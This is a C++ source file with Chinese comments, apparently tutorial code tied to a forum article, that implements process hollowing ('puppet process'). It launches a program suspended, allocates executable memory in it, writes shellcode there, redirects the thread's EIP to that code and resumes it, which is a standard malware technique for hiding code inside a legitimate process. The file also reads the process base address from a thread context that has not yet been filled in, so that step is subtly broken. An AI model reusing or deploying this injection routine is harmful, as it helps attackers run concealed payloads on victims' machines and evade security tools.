#include "stdafx.h"
#include "ReplaceProcess.h"

//详细文章：https://forum.butian.net/share/825

void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = {0};
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}

/*
	傀儡进程的创建原理就是修改某一进程的内存数据，向内存中写入Shellcode代码，
并修改该进程的执行流程，使其转而执行Shellcode,这样进程还是原来的进程，但执行的操作被替换。

两个关键技术点：
一是写入Shellcode数据的时机，二是更改执行流程的方法。

CreateProcess 提供 CREATE_SUSPENDED 作为线程建立后主进程挂起等待的标志，这时主线程处于挂起状态，不往下执行代码
直到通过 ResumeThread 恢复线程，方可继续执行。
（相当于汇编的IP指针，指向谁执行谁，所以我们的目标就是改变指针所指）
*/

// 创建进程并替换进程内存数据, 更改执行顺序
//DWORD dwRunOffset :       Shellcode中开始代码相对首地址的偏移
BOOL ReplaceProcess(char *pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize, DWORD dwRunOffset)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT threadContext = { 0 };
	BOOL bRet = FALSE;
	::RtlZeroMemory(&si, sizeof(si));
	::RtlZeroMemory(&pi, sizeof(pi));
	::RtlZeroMemory(&threadContext, sizeof(threadContext));
	si.cb = sizeof(si);

	// 创建进程并挂起主线程
	bRet = ::CreateProcess(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		ShowError("CreateProcess");
		return FALSE;
	}

	// 读取基址的方法: 此时context中的EBX是指向PEB的指针, 
	// ImageBaseAddress在+0x008这个位置，所以这个地方ReadProcessMemory的参数就是PEB+8
	// 我们可以根据 PEB_LDR_DATA 获取进程基址以及遍历进程链获取所有进程
	 
	DWORD dwProcessBaseAddr = 0;
	::ReadProcessMemory(pi.hProcess, (LPVOID)(8 + threadContext.Ebx), &dwProcessBaseAddr, sizeof(dwProcessBaseAddr), NULL);
	printf("%d\n",dwProcessBaseAddr);

	// 在替换的进程中申请一块内存 
	LPVOID lpDestBaseAddr = ::VirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr)
	{
		ShowError("VirtualAllocEx");
		return FALSE;
	}
	// 写入替换的数据
	bRet = ::WriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);
	if (FALSE == bRet)
	{
		ShowError("WriteProcessError");
		return FALSE;
	}

	/*
	每个线程内核对象都维护着一个CONTEXT结构，里面保存了线程运行的状态，线程也就是eip，
	这样可以使CPU可以记得上次运行该线程运行到哪里了，该从哪里开始运行，
	所以我们要先获取线程上下文的状态，使用到GetThreadContext
	*/


	// 获取线程所有上下文
	// 注意此处标志，一定要写!!!
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi.hThread, &threadContext);

	if (FALSE == bRet)
	{
		ShowError("GetThreadContext");
		return FALSE;
	}


	// 修改进程的PE文件的入口地址以及映像大小,先获取原来进程PE结构的加载基址
	// ip指针修改为想要执行的shellcode,即 修改线程上下文中EIP的值为申请的内存的首地址 + Shellcode中开始代码相对首地址的偏移
	threadContext.Eip = (DWORD)lpDestBaseAddr + dwRunOffset;

	// 设置挂起进程的线程上下文
	bRet = ::SetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet)
	{
		ShowError("SetThreadContext");
		return FALSE;
	}
	// 恢复挂起的进程的线程
	::ResumeThread(pi.hThread);

	return TRUE;
}

